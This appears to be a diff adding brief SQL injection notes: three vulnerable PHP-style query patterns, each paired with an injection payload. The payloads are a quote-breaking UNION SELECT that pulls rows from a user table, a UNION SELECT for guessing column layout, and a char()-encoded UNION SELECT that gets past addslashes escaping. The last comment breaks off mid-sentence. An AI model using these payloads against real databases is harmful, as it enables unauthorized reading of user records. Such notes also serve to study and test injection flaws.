@@ -1,0 +1,13 @@
+sql1 : SELECT * FROM article WHERE articleid='$id'
+sql2 : SELECT * FROM article WHERE articleid=$id
+sql3 : $userid = addslashes($userid);    SELECT * FROM user WHERE userid=$userid
+for sql1:   $id = "1' and 1=2 union select * from user where userid=1/*"
+
+
+for sql2: $id = "1 union select 1,1,1";   
+//guess table format 
+
+
+
+for sql3 $id = "id=-1 union select char(97),char(97),char(97)";
+//let injection still useful without 
